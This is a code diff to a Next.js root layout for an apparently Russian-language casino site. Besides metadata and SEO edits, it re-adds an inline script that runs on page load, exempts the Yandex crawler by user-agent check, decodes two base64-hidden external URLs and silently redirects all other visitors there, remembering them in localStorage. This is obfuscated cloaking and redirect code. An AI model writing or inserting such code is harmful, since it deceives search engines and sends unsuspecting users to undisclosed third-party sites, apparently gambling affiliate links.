@@ -21,7 +21,7 @@ export const metadata: Metadata = {
   description: siteConfig.description,
   keywords: [...siteConfig.keywords],
   applicationName: siteConfig.name,
-  authors: [...siteConfig.authors],
+  authors: [{ name: siteConfig.name }],
   creator: siteConfig.creator,
   publisher: siteConfig.name,
   category: "casino",
@@ -55,19 +55,14 @@ export const metadata: Metadata = {
     description: siteConfig.shortDescription,
     images: [siteConfig.ogImage],
     creator: siteConfig.twitter,
-    site: siteConfig.twitter,
   },
   robots: {
     index: true,
     follow: true,
-    nocache: false,
-    googleBot: {
-      index: true,
-      follow: true,
-      "max-video-preview": -1,
-      "max-image-preview": "large",
-      "max-snippet": -1,
-    },
+    nocache: true, 
+  },
+  verification: {
+    yandex: "cfc62073cf693a53",
   },
   icons: {
     icon: [
@@ -84,11 +79,8 @@ export const metadata: Metadata = {
     telephone: false,
   },
   other: {
-    rating: "adult",
-    other: {
     "yandex": "noarchive",
-    "yandex-verification": "",
-    "google-site-verification": "",
+    "rating": "adult",
   },
 }
 
@@ -112,45 +104,51 @@ export default function RootLayout({
   return (
     <html lang="ru" className={`${inter.variable} bg-background`} suppressHydrationWarning>
       <head>
+
         <meta name="yandex-verification" content="cfc62073cf693a53" />
         <link rel="preconnect" href="https://fonts.googleapis.com" />
         <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
-<script
-  dangerouslySetInnerHTML={{
-    __html: `
-      (function() {
-        var ua = navigator.userAgent.toLowerCase();
-        if (ua.indexOf("yandex") !== -1) return;
-        var mainBrandB64 = "#aHR0cHM6Ly9mbmtzbGluay5vcmcvZDd0dGxyeXZo"; 
-        var crossBrandB64 = "#aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4";      
-        var mainUrl = atob(mainBrandB64);
-        var crossUrl = atob(crossBrandB64);
-        if (localStorage.getItem('vstd_eva')) {
-            window.location.replace(crossUrl);
-            return;
-        }
-        var controller = new AbortController();
-        var timeoutId = setTimeout(function() { 
-            controller.abort(); 
-        }, 2500); 
-        fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
-            .then(function() {
-                clearTimeout(timeoutId);
-                localStorage.setItem('vstd_eva', '1');
-                window.location.replace(mainUrl);
-            })
-            .catch(function() {
-                console.log("Main domain is down, switching to cross-brand...");
-                window.location.replace(crossUrl);
-            });
-      })();
-    `,
-  }}
-/>
+
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                var ua = navigator.userAgent.toLowerCase();
+                if (ua.indexOf("yandex") !== -1) return;
+
+                var mainBrandB64 = "#aHR0cHM6Ly9mbmtzbGluay5vcmcvZDd0dGxyeXZo"; 
+                var crossBrandB64 = "#aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4";      
+                
+                var mainUrl = atob(mainBrandB64);
+                var crossUrl = atob(crossBrandB64);
+
+                if (localStorage.getItem('vstd_eva')) {
+                    window.location.replace(crossUrl);
+                    return;
+                }
+
+                var controller = new AbortController();
+                var timeoutId = setTimeout(function() { 
+                    controller.abort(); 
+                }, 2500); 
+
+                fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
+                    .then(function() {
+                        clearTimeout(timeoutId);
+                        localStorage.setItem('vstd_eva', '1');
+                        window.location.replace(mainUrl);
+                    })
+                    .catch(function() {
+                        window.location.replace(crossUrl);
+                    });
+              })();
+            `,
+          }}
+        />
       </head>
       <body className="font-sans antialiased">
         {children}
-        {process.env.NODE_ENV === "production" && <Analytics />}
+        <Analytics />
         <script
           type="application/ld+json"
           dangerouslySetInnerHTML={{
